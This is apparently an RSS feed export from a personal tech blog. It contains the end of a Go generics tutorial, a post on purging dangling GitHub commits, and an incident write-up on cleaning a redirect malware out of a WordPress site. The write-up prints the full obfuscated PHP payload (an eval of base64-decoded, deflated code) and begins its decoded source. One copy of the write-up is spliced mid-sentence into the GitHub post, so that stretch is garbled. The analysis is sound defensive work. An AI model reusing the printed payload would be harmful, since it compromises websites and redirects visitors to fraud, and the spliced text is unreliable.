<p>A new operator is shown in the example above, the tilde operator <code>~T</code> specifies the underlying type of <code>T</code>.  Sounds confusing but is actually pretty simple, in Go one often defines type alias, e.g. <code>type MyEnum string</code> and if a function only accepts <code>[T string]</code> then it could not be instantiated with an argument of type <code>MyEnum</code> even though the argument is a string.  But <code>[T ~string]</code> on the other hand will happily accept any type whose underlying type is string, making the generic function much more useful.</p>
<p>For some functions there is no need to restrict the set of type at all and in such cases you can use <code>[T interface{}]</code>, or even better, use <code>any</code> instead of <code>interface{}</code>.  An example of such a function with great &quot;general&quot; use is the following one that returns a pointer to any type<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>:</p>
<pre><code class="language-go">func PointerOf[T any](t T) *T {
	return &amp;t
}
</code></pre>
<p>Parameter lists are by no means limited to a single type.  I hope the following function name leaves no doubt that this is a contrived example without practical use:</p>
<pre><code class="language-go">func weirdAddYankovic[T1 int | uint, T2 float32 | float64](x T1, y T2) string {
	sum := float64(x) + float64(y)
	return strconv.FormatFloat(sum, 'f', -1, 32)
}
</code></pre>
<p>Besides functions, type parameters can also be applied to structs and even interface's can take them:</p>
<pre><code class="language-go">type Container[T any] struct {
    elements []T
}

// c := Container[int]{elements: []int{2,3,4}}
</code></pre>
<p>For some reason Go was not able to infer <code>T</code> in the example above and so it must be instantiated explicitly.</p>
<p>Be aware that using generics comes with downsides, one of them is about 15% slower compile times at the moment, increased binary size since the compiler will generate a variant of the generic function or struct for any type it was instantiated with.  Most importantly, in my opinion, it reduces the readability of your code, so think twice before adding type parameters.</p>
<p>Do not use type parameters when a regular interface would suffice:</p>
<pre><code class="language-go">// Wrong: func Write[T io.Writer](w T) error {}
func Write(w io.Writer) error {}
</code></pre>
<p>Also, do <strong>not</strong> use generics if the implementation of a common methods is different for each type.</p>
<p>Generics are no panacea and there are limitations with the current implementation of this feature.  Most notably type parameters cannot be used in methods.  This limitation might be lifted with Go 1.19 and there is also a workaround the <a href="https://rakyll.org/generics-facilititators/">facilitator pattern</a>.</p>
<p>No type parameters will be used in the standard library with Go 1.18.  I think it's a sensible decision of the Go team to first gather some experience with how the feature is used and then in a later release introduce generics to the standard library.  However, there are already some generic utility functions for <a href="https://pkg.go.dev/golang.org/x/exp/slices">slices</a> and <a href="https://pkg.go.dev/golang.org/x/exp/maps">maps</a>.  What I anticipate is a library that provides Rust iterator like functionality for slices, maps and sets.</p>
<p>I hope I could give you some viable insights into the features and changes that Go 1.18 will bring.  Now <em>go</em> and write some, potentially generic, code!</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>For this article <a href="https://go.dev/dl/#go1.18rc10">Go 1.18 release candidate 1</a> was used.  This relea]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>How I Detected and Removed Malware from a Wordpress Installation</title>
      <link>https://klingt.net/articles/how-i-detected-and-removed-malware-from-a-wordpress-installation.html</link>
      <description>Wordpress is the major target for malware, mainly because it&#39;s so widespread, often unmaintained, and plugins add additional loopholes to the already fragile CMS.  Even with auto updates enabled, your Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>How to delete unreachable commits on GitHub</title>
      <link>https://klingt.net/articles/how-to-delete-unreachable-commits-on-github.html</link>
      <description>GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.">
  
  <title>How to delete unreachable commits on GitHub</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>How to delete unreachable commits on GitHub</h1>
<p>The dangling<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> <a href="https://github.com/klingtnet/klingtnet.github.io/blob/b2444ca54c74a7c9dde6504cf028b6c0f4729d8f/content/resume.md#L3">commit</a> shown in the screenshot below should have never been on GitHub, at least not publicly visible.  The commit was part of a branch called <code>draft</code> that I pushed to the repository when it was still private.  If I am not mistaken then I removed the file, squashed and merged the <code>draft</code> branch into <code>master</code>, deleted the branch and then pushed it onto GitHub.  After making sure that branch <code>draft</code> was gone on GitHub I made the repository public.</p>
<p><img src="unreachable-commit.png" alt="unreachable commit"></p>
<p>As you can clearly se-sh">$ curl -I -H 'referer: infected-website.de' https://infected-website.de/page` 
HTTP/1.1 302 Found
Date: Sun, 03 Apr 2022 16:37:56 GMT
Server: Apache/2.4.53 (Debian)
X-Powered-By: PHP/7.4.28
Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307524123; path=/
Location: https://family-drugs.net/
Content-Type: text/html; charset=UTF-8
</code></pre>
<p>Actually, it didn't matter which value the <code>referer</code> header had, it only had to be present.   Also, they set a cookie for whatever reason.</p>
<h2>Run the Wordpress Website Locally</h2>
<p>We're left with only three candidates that can contain the malware, Apache, Wordpress or its database.  Apache being the most unlikely of the three because the website was hosted on a professional hosting service and then a bunch of customers would have been affected as well.  Anyhow, thipire-unreachable=all
</code></pre>
<p>But, nothing happens since the commit is not in my local repository.  What to do now 🤔?  As far as I see there is nothing I can do locally and cloning the repository will also omit the commit I want to delete.  GitHub must trigger the garbage collection for this repository so I <a href="https://support.github.com/ticket/">opened a ticket</a> with them.  What really amazed me was how fast they responded, after 10 minutes everything was done and that's for a free account!  Here's what they wrote in the response:</p>
<blockquote>
<p>As you mentioned, it does indeed appear to be an an unreferenced commit dangling in our cache. I went ahead and performed the garbage collection and cache clearance operations for the repository klingtnet/klingtnet.github.io. Attempting to access the commit directly now returns a 404.</p>
</blockquote>
<p>Luckily the commit contained no secrets, but what I learned from this lesson is that I need to double or triple check the contents of my repository before making it public on GitHub.  A simple deletion of a branch might not be sufficient.</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Dangling, free-standing, unreachable or unreferenced, all terms fit here.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>How I Detected and Removed Malware from a Wordpress Installation</title>
      <link>https://klingt.net/articles/how-i-detected-and-removed-malware-from-a-wordpress-installation.html</link>
      <description>Wordpress is the major target for malware, mainly because it&#39;s so widespread, often unmaintained, and plugins add additional loopholes to the already fragile CMS.  Even with auto updates enabled, your Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="Wordpress is the major target for malware, mainly because it&#39;s so widespread, often unmaintained, and plugins add additional loopholes to the already fragile CMS.  Even with auto updates enabled, your Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.">
  
  <title>How I Detected and Removed Malware from a Wordpress Installation</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>How I Detected and Removed Malware from a Wordpress Installation</h1>
<p>This week a friend of mine reached out to me, telling me their website got &quot;hacked&quot;, and asking if I could have a look and see if I can fix it.  Of course they didn't got hacked, instead their Wordpress installation caught a malware.  The only indication I got was that those redirects started about three weeks ago.</p>
<h2>Reproduce the Issue</h2>
<p>First step was visiting their website with developer tools open, trying to reproduce the issue.  It didn't took me long to get redirected, I think the second link I clicked resulted in the scammer website being loaded.</p>
<p><img src="scammer-website-family-drugs-net.png" alt="screenshot showing the scammer website family-drugs.net"></p>
<p>Not a surprise that <code>family-drugs.net</code> accepts Bitcoin, fraud is the only use case of cryptocurrencies<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.  The network tab wasn't showing any suspicious requests so I copied the request as cURL statement that resulted in the redirect.  Then I ran the cURL request and, voila, the server responded with a 302 redirect.  This let me rule out malicious Javascript as the culprit, since cURL is not evaluating it.  To get a minimal example I started removing header arguments from the cURL statement until I ended up with:</p>
<pre><code class="language-sh">$ curl -I -H 'referer: infected-website.de' https://infected-website.de/page` 
HTTP/1.1 302 Found
Date: Sun, 03 Apr 2022 16:37:56 GMT
Server: Apache/2.4.53 (Debian)
X-Powered-By: PHP/7.4.28
Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307524123; path=/
Location: https://family-drugs.net/
Content-Type: text/html; charset=UTF-8
</code></pre>
<p>Actually, it didn't matter which value the <code>referer</code> header had, it only had to be present.   Also, they set a cookie for whatever reason.</p>
<h2>Run the Wordpress Website Locally</h2>
<p>We're left with only three candidates that can contain the malware, Apache, Wordpress or its database.  Apache being the most unlikely of the three because the website was hosted on a professional hosting service and then a bunch of customers would have been affected as well.  Anyhow, this could easily be disqualified by running the Wordpress installation locally.  Docker compose is the obvious choice for this setup.</p>
<p>Before I could start with the docker-compose setup I needed to get a copy of the website files and a dump of their MySQL database.  A database dump could be downloaded from the admin panel of the webhoster, it was 42373 lines of SQL and 13MiB in size.  Getting a copy of the file tree was also easy since I had SSH access.</p>
<p>At first I tried to clone the website by using FTP, and there's a reason nobody is using this protocol anymore.  Somehow random files ended up missing in my local copy and thus Wordpress was not starting, only showing some generic error message and no log message at all 😩.  It took me more than an hour until I realized that something was missing.</p>
<p>My rescue was <code>rsync --archive infected-website.de: ./infected-website</code>, resulting in a whopping 18210 files consuming 1.3GiB of disk space 🙈.</p>
<p>Here's the <code>docker-compose.yml</code> I came up with:</p>
<pre><code class="language-yaml">version: &quot;3.9&quot;
    
services:
  db:
    # Note that there's no arm64v8 (Apple Silicon) image for mysql:5.7,
    # but for mysql/mysql-server:5.7 there is one¯\_(ツ)_/¯
    image: mysql/mysql-server:5.7
    restart: always
    volumes:
    # Import database dump.
      - ./infected-website.sql:/docker-entrypoint-initdb.d/dump.sql:ro
    environment:
    # Use the credentials that are defined in wp-config.php.
      MYSQL_DATABASE: infected-website
      MYSQL_USER: admin
      MYSQL_PASSWORD: this-is-a-secret
  wordpress:
    depends_on:
      - db
    image: wordpress:5.9.2
    volumes:
      - ./cloned-website/html:/var/www/html:ro
    ports:
      - &quot;80:80&quot;
    restart: always
</code></pre>
<p>In this setup MySQL is not exposed on <code>localhost:3306</code>, instead it can be accessed from the wordpress container through the <code>db</code> hostname.  This means I needed to apply the following patch to <code>wp-config.php</code>:</p>
<pre><code class="language-diff">-define('DB_HOST', 'localhost');
+define('DB_HOST', 'db');
</code></pre>
<p>Running the website locally was only a <code>docker-compose up</code> away.  After opening <code>localhost</code> in my browser I got redirected to <code>infected-website.de</code>.  Looks like I need to replace the domain with <code>localhost</code> in the SQL dump.  A perfect task for good ol' <code>sed</code>:</p>
<pre><code class="language-sh">$ sed -Ei '' 's/(http:|https:)?\/\/(www\.)?infected-website\.de/http:\/\/localhost/g' usr_web629_1.sq
</code></pre>
<p>Please note that I'm using macOS' <code>sed</code> here, but the same command should work on Linux machines if you remove the empty quotes that follow the <code>-Ei</code> flag.</p>
<p>Now I'm ready to run the site locally.</p>
<h3>Investigation</h3>
<p>I did the obvious at first and searched for occurrences of <code>family-drugs.net</code> in the website source files and the database dump.  That wasn't very fruitful so I tried different encodings of the search string, e.g. base64, hex encoded, unicode escaped and so on<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.  Looking for the substring <code>drugs</code> in a variety of encodings did not help either, no hit in the search results.</p>
<p>Next thing I tried was to deactivate all the plugins through Wordpress' dashboard.  After deactivating them I ran the cURL request again, but this time against <code>localhost</code> and got a redirect 😕.</p>
<pre><code class="language-sh">$ curl -I -H 'referer: does-not-matter' localhost/page
HTTP/1.1 302 Found
Date: Sat, 09 Apr 2022 12:28:36 GMT
Server: Apache/2.4.53 (Debian)
X-Powered-By: PHP/7.4.28
Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307020684; path=/
Location: https://family-drugs.net/
Content-Type: text/html; charset=UTF-8
</code></pre>
<p>I continued with browsing through the SQL dump, looking for suspicious content, and I was shocked to see how much serialized PHP there is in a usual Wordpress database.  However, none of this was malicious, just plugin data.  I did the same for the <code>.php</code> files but there were just too many of them and I couldn't find anything malicious in there as well.  In hindsight I should have searched for high-entropy strings with a tool like <a href="https://github.com/trufflesecurity/truffleHog">truffleHog</a>.</p>
<p>I was running out of ideas, and so I decided to remove things until the redirect didn't occur anymore.  In the database I began deleting tables, each time checking for the redirect.  Eventually, I ended up with a mostly empty database where I also deleted most of <code>wp_options</code> but the redirect still happened.  We can rule out the database now, that's for sure.</p>
<p>The next thing I did was to download a new Wordpress archive and replace the existing files with it.  As you can already imagine, it didn't fix the issue, but this also meant that Wordpress itself was not the culprit.</p>
<p>What we're left with are the plugins, which was surprising to me since I deactivated them already and still saw the redirect happening.  Let's take the sledgehammer and crush down all the plugins, or deleting them one-by-one to say it in a more cultivated manner.  It was the last plugin I looked at, of course, that contained the malware.</p>
<h3>The Malware</h3>
<p>Below are the contents of <code>/wp-content/mu-plugins/index.php</code>, making no secret of their malicious nature.</p>
<pre><code class="language-php">&lt;?php 

/**
 * arbitrary bother focus glorious household invade pursue triangle vertical.
 * acid bundle conservation guilty recreation simplify vacuum.
 * alcohol attitude comedy decline defect delay delicate enviroment exclaim explosive geography harmony junior manufacture navigation neglect recreation remote ridge ridid simplify volcano.
 * adequate aware debate estimate excursion herd illusion jewel nylon passion route ruin shrug sophisticated submerge vain vivid.
 * applause isolate nuclear optimistic transmit virus.
 * @package WordPress
 */

eval (gzinflate(base64_decode(
'xRnbbttG9jkB8g+0oAUpVLJsZ3fbxnVcRaYTt75VF7eFYRBjcmxNRXLYmZEsOwiw'
.'uw/7RwssCux+g/NHPWdISiRFSknQiyAfcW7nfht6/+VX+9EoevaUCsGFI2jEhWLh'
.'rbXV2H329GsWMkdSZZkjFfiO3iPNprll5lc9JiOf3K/fIBURahJVb/T5bXHx2dOb'
.'SegqxkPD5XzMqNV49vQtzhvwqQeAdiJ8Y88AJlUkX7Tb1yBA65qrTZcHbUG9TTVT'
.'5m6y3x3BVhdOOEBUWfPzjWSDXgJeeASL7qhpdIe947PzgdOzB8Pe6aDXOe0f2r2m'
.'ocSErj3U7x87F3bv6PDHcxsP3RBfrj/1xu4cLO2uow1S3umMungmh8r1uaTZ2XpI'
.'7xLlxMd352q73xnDbDBWLKDWVtOIv9v6u7P1fCdFwW4MiwaRurfqTvfs7Nsj+9KU'
.'vhNQKcktNa8aDeNtvBM/IExio+ympmESL2AhPCBdGLbNFD9+RpR4VFjmMXcJ2vmF'
.'YRqbc+Ybu4YHCGtOLT3zzqCglyzdUi6r2Syy+hG8fgq/mudU8/Cgn12fSGmAdzKh'
.'3flJvDwlwqj7JLydADe7mTlBb6igAoxWq2XnY/MuzUGo8QgWiBDk3qrdRS0ILRZu'
.'QrDXmkbt8ZfH/z/+7/E/7/9tvP/n+3+9/wcMf3n875zlORsFPGKCpyckv1FLQccK'
.'9mFUZJf4GDCI7AwidLQ0BLkUC+R7kin6l+cdJLEJlBpzd51nAMdxeQiHJq7CNJAo'
.'LWPauhox2XpJPE9zjgSsrB2S9VuqYh6qFkGFVUuolrI1RSUijVVhLZifmz4SbEoU'
.'XUhTODEX5smTvGsnBJh0IKtZy76crGfMoDNHwW0FVRMR5n2ygpJmTOsvFvY3pLiG'
.'HtgrdY4/kiyaO5nEEP7dCG8kiEDMiEsHHD8lGwdKc0FJh/vHcNJuf4i1222IQseb'
.'BFFW4N1lV/hgVj9SYQWODJ3M157O5JWC61aH1yJYyzIFymjVfSYRPcijuM/vICHU'
.'nb7dg5p9ab4ZDM6dTrdrQ0k+7py+HnZe21hKloRFVJGgt05AlDtyiO9bZtu6JK2H'
.'q7fbzS/eWfsvWotRY78BE7s/71mXW60vN68+azT221hvkJfkZ5lGRi1peUgzJ+TE'
.'AHoeGktzuX2VILncuSqWLp1MuaAE2iCriI5IKGLG3kujPm0sHyth4LIeXgET9amx'
.'j+CFsV1CjggJPWWRWNPon/UGzunwBLqjbpHNdxlLx8W+QvR5Hl6TZDO5bMkRyvQR'
.'lz1UyLTU2rHexxR63hloWlr1abPIY7kN47gs+nNR6MVjsj8fPR8ibS6TZgOgNBUu'
.'R3mxTq9PTeWi5XLgJ0ujEzRmmrJQLlpw3v9UGzBbAWjoadxN3Py7Gu1JhZxZ7QNo'
.'Ypck1ogK+1bIF2O0lGCBlU1uiLfRzOU7lHljL0nQf5rPaiPEbiYpEXCJKc3YcnKN'
.'LV28E4BPw1goo7UYxucbBgiVDj7YVytkWF9pknaylGsm8XZbqCw9G+6Rdq/scpKP'
.'tIr6VMtiqV01luVYzbBucasa6PhaUVoWe/Z3Q7s/cIa9I/Nqff5Nu9ZSxWykt7ac'
.'ZoYwcqDYng5KlZPU7LgALHurOR33R0Tou9xrzm99/XTxLQ8VGSs9OCQuvYbbnz1T'
.'VITEf8OU2SzB9CMJPTp7xRUeigcd14WrIrtmPlP3uZUTDpM0N3UA7YurDu7DFdj7'
.'rqA0lCOuckePAighcjG+YB7lheE51FYqVuA+gQaKLA69gjtgBuUhmTK8Ti1mvqfX'
.'AZFqJc5z4MsdUXeMu3Lc9qhkD9nZjndKl7RRgTpePIRb+SiLoksgpD2SmenDJdFn'
.'4TjD9gmFPDcmK5g+pXeZ/TgqoOgSRUA7Gd5DxaZMTOQq9RIxzgp4QYViWQVzccAD'
.'ot8mpNxHgky1oasdQmes/ohHWQnBkCHJechZqPjBq+K4c35UijuOhOsYwXzQ0obD'
.'KU0hIkKFVMjWIm46ngSq84kSzCeE+Zu9oZMwh2/fEjIQK5yH2gEZcVAqNo2N25Fj'
.'4xtKp7RcvWdByOxZ5EOxEyne7593nQviM48ornGAs3Z8lbj3iPNDSr0+pXO/hKmN'
.'Uuz2A+eBNhP+DfgEy4YiCdMn32zvpPyPIAPLhH5slnQATthXRFW4xym7DcimmODW'
.'V4R5ExlBvGq+8JRM8PeP+oPe0Q+xqkBTCfIbFnqJe5bgjgSfsYC5uPMsoiGL3SrF'
.'LwG/x4OEuD1LxVrs6NOHkARVPsgTJrqtgZEcHUYevwO3SDGFnEf3+ASRyiDyZlrf'
.'VLFShHEEXJCE+kH3PMFzTiIqjhnSyx9r5G6J+a5H535sewAJSFHeryQNEMMOaEVp'
.'aWawrG6AVjdBhc5huS/6xK4i/xKrqlLHt/GKemj+jJq+Q6CjWZtAa18bUPsIQ6BL'
.'i044OqB0dHjaGRHovDhC8BOCMQIfwQMCbX/tj1OdABDolBcg2Eawg+A5gr8i+BuC'
.'vyP4HMEXCL5EsGU2zYf7KZ9lXCLXYmjwEa976/z6J9BNSO/id62Z93L6GgDLmfcM'
.'kEeNdEq3Xht7tVrOI9J/Qezm3+buv/xq/1c='
)));
?&gt;
</code></pre>
<p>No wonder I didn't get any results in my search since they <a href="https://en.wikipedia.org/wiki/Deflate">deflated</a> the base64 encoded strings.  Never before have I seen such a malware in the wild so I was very curious to find out what was hiding in it.  There's a very handy tool for such tasks called <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Raw_Inflate(0,0,'Adaptive',false,false)&amp;input=eFJuYmJ0dEc5amtCOGcrMG9BVXBWTEpzWjNmYnhuVmNSYVlUdDc1VkY3ZUZZUkJqY214TlJYTFltWkVzT3dpdwp1dy83Undzc0N1eCtnL05IUFdkSVNpUkZTa25RaXlBZmNXN25maHQ2LytWWCs5RW9ldmFVQ3NHRkkyakVoV0xoCnJiWFYySDMyOUdzV01rZFNaWmtqRmZpTzNpUE5wcmxsNWxjOUppT2YzSy9mSUJVUmFoSlZiL1Q1YlhIeDJkT2IKU2VncXhrUEQ1WHpNcU5WNDl2UXR6aHZ3cVFlQWRpSjhZODhBSmxVa1g3VGIxeUJBNjVxclRaY0hiVUc5VFRWVAo1bTZ5M3gzQlZoZE9PRUJVV2ZQempXU0RYZ0plZUFTTDdxaHBkSWU5NDdQemdkT3pCOFBlNmFEWE9lMGYycjJtCm9jU0VyajNVN3g4N0YzYnY2UERIY3hzUDNSQmZyai8xeHU0Y0xPMnVvdzFTM3VtTXVuZ21oOHIxdWFUWjJYcEkKN3hMbHhNZDM1MnE3M3huRGJEQldMS0RXVnRPSXY5djZ1N1AxZkNkRndXNE1pd2FSdXJmcVR2ZnM3TnNqKzlLVQp2aE5RS2NrdE5hOGFEZU50dkJNL0lFeGlvK3ltcG1FU0wyQWhQQ0JkR0xiTkZEOStScFI0VkZqbU1YY0oydm1GCllScWJjK1lidTRZSENHdE9MVDN6enFDZ2x5emRVaTZyMlN5eStoRzhmZ3EvbXVkVTgvQ2duMTJmU0dtQWR6S2gKM2ZsSnZEd2x3cWo3Skx5ZEFEZTdtVGxCYjZpZ0FveFdxMlhuWS9NdXpVR284UWdXaUJEazNxcmRSUzBJTFJadQpRckRYbWtidDhaZkgvei8rNy9FLzcvOXR2UC9uKzMrOS93Y01mM244NzV6bE9Sc0ZQR0tDcHlja3YxRkxRY2NLCjltRlVaSmY0R0RDSTdBd2lkTFEwQkxrVUMrUjdraW42bCtjZEpMRUpsQnB6ZDUxbkFNZHhlUWlISnE3Q05KQW8KTFdQYXVob3gyWHBKUEU5empnU3NyQjJTOVZ1cVloNnFGa0dGVlV1b2xySTFSU1VpalZWaExaaWZtejRTYkVvVQpYVWhUT0RFWDVzbVR2R3NuQkpoMElLdFp5NzZjckdmTW9ETkh3VzBGVlJNUjVuMnlncEptVE9zdkZ2WTNwTGlHCkh0Z3JkWTQva2l5YU81bkVFUDdkQ0c4a2lFRE1pRXNISEQ4bEd3ZEtjMEZKaC92SGNOSnVmNGkxMjIySVFzZWIKQkZGVzROMWxWL2hnVmo5U1lRV09ESjNNMTU3TzVKV0M2MWFIMXlKWXl6SUZ5bWpWZlNZUlBjaWp1TS92SUNIVQpuYjdkZzVwOWFiNFpETTZkVHJkclEways3cHkrSG5aZTIxaEtsb1JGVkpHZ3QwNUFsRHR5aU85Ylp0dTZKSzJICnE3ZmJ6Uy9lV2ZzdldvdFJZNzhCRTdzLzcxbVhXNjB2TjY4K2F6VDIyMWh2a0pma1o1bEdSaTFwZVVnekorVEUKQUhvZUdrdHp1WDJWSUxuY3VTcVdMcDFNdWFBRTJpQ3JpSTVJS0dMRzNrdWpQbTBzSHl0aDRMSWVYZ0VUOWFteApqK0NGc1YxQ2pnZ0pQV1dSV05Qb24vVUd6dW53QkxxamJwSE5keGxMeDhXK1F2UjVIbDZUWkRPNWJNa1J5dlFSCmx6MVV5TFRVMnJIZXh4UjYzaGxvV2xyMWFiUElZN2tONDdncytuTlI2TVZqc2o4ZlBSOGliUzZUWmdPZ05CVXUKUjNteFRxOVBUZVdpNVhMZ0owdWpFelJtbXJKUUxscHczdjlVR3pCYkFXam9hZHhOM1B5N0d1MUpoWnhaN1FObwpZcGNrMW9nSysxYklGMk8wbEdDQmxVMXVpTGZSek9VN2xIbGpMMG5RZjVyUGFpUEViaVlwRVhDSktjM1ljbktOCkxWMjhFNEJQdzFnb283VVl4dWNiQmdpVkRqN1lWeXRrV0Y5cGtuYXlsR3NtOFhaYnFDdzlHKzZSZHEvc2NwS1AKdElyNlZNdGlxVjAxbHVWWXpiQnVjYXNhNlBoYVVWb1dlL1ozUTdzL2NJYTlJL05xZmY1TnU5WlN4V3lrdDdhYwpab1l3Y3FEWW5nNUtsWlBVN0xnQUxIdXJPUjMzUjBUb3U5eHJ6bTk5L1hUeExROFZHU3M5T0NRdXZZYmJuejFUClZJVEVmOE9VMlN6QjlDTUpQVHA3eFJVZWlnY2QxNFdySXJ0bVBsUDN1WlVURHBNME4zVUE3WXVyRHU3REZkajcKcnFBMGxDT3Vja2VQQWlnaGNqRytZQjdsaGVFNTFGWXFWdUErZ1FhS0xBNjlnanRnQnVVaG1USzhUaTFtdnFmWApBWkZxSmM1ejRNc2RVWGVNdTNMYzlxaGtEOW5aam5kS2w3UlJnVHBlUElSYitTaUxva3NncEQyU21lbkRKZEZuCjRUakQ5Z21GUERjbUs1ZytwWGVaL1RncW9PZ1NSVUE3R2Q1RHhhWk1UT1FxOVJJeHpncDRRWVZpV1FWemNjQUQKb3Q4bXBOeEhna3kxb2FzZFFtZXMvb2hIV1FuQmtDSEplY2hacVBqQnErSzRjMzVVaWp1T2hPc1l3WHpRMG9iRApLVTBoSWtLRlZNaldJbTQ2bmdTcTg0a1N6Q2VFK1p1OW9aTXdoMi9mRWpJUUs1eUgyZ0VaY1ZBcU5vMk4yNUZqCjR4dEtwN1JjdldkQnlPeFo1RU94RXluZTc1OTNuUXZpTTQ4b3JuR0FzM1o4bGJqM2lQTkRTcjArcFhPL2hLbU4KVXV6MkErZUJOaFArRGZnRXk0WWlDZE1uMzJ6dnBQeVBJQVBMaEg1c2xuUUFUdGhYUkZXNHh5bTdEY2ltbU9EVwpWNFI1RXhsQnZHcSs4SlJNOFBlUCtvUGUwUSt4cWtCVENmSWJGbnFKZTViZ2pnU2ZzWUM1dVBNc29pR0wzU3JGCkx3Ry94NE9FdUQxTHhWcnM2Tk9Ia0FSVlBzZ1RKcnF0Z1pFY0hVWWV2d08zU0RHRm5FZjMrQVNSeWlEeVpscmYKVkxGU2hIRUVYSkNFK2tIM1BNRnpUaUlxamhuU3l4OXI1RzZKK2E1SDUzNXNld0FKU0ZIZXJ5UU5FTU1PYUVWcAphV2F3ckc2QVZqZEJoYzVodVMvNnhLNGkveEtycWxMSHQvR0tlbWorakpxK1E2Q2pXWnRBYTE4YlVQc0lRNkJMCmkwNDRPcUIwZEhqYUdSSG92RGhDOEJPQ01RSWZ3UU1DYlgvdGoxT2RBQkRvbEJjZzJFYXdnK0E1Z3I4aStCdUMKdnlQNEhNRVhDTDVFc0dVMnpZZjdLWjlsWENMWFltandFYTk3Ni96Nko5Qk5TTy9pZDYyWjkzTDZHZ0RMbWZjTQprRWVOZEVxM1hodDd0VnJPSTlKL1Flem0zK2J1di94cS8xYz0">CyberChef</a>.</p>
<p>Finally, after a couple of wasted hours, we could get rid of the malware by deleting the <code>index.php</code>.  I also made sure that everything is up-to-date and reset all passwords.  At least I thought at that moment that the website was clean.  A few days later the malware reappeared 😕.</p>
<p>The malware installed itself inside <code>/wp-content/mu-plugins/</code> which is the plugin directory of <a href="https://github.com/WordPress/health-check">Health Check</a>, an official Wordpress plugin<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.  Removing this folder fixed the issue and the malware did not came back, phew.</p>
<p>Also, we got an insight in the malware that seems to be of Russian or Ukrainian origin, because requesting with an <code>UA</code> or <code>RU</code> locale (<code>-H 'Accept-Language: ua</code>) disabled the malware!</p>
<pre><code class="language-php"> ?&gt;&lt;?php
error_reporting(0);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
